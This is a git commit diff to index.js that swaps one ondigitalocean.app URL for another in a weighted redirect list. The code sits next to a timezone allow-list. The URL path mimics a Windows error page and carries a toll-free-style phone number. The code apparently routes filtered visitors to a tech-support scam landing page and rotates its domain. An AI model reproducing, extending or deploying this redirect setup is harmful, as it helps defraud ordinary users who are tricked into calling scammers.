a6748f700381d1f2a8c16ab421f0968e8ef6121f
paalakash <palaksh452@gmail.com>
2026-06-10 09:24:56 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://jellyfish-app-fpdyz.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3536", weight: 1.0 }
+    { url: "https://monkfish-app-p73kc.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3536", weight: 1.0 }
 
 ];
 
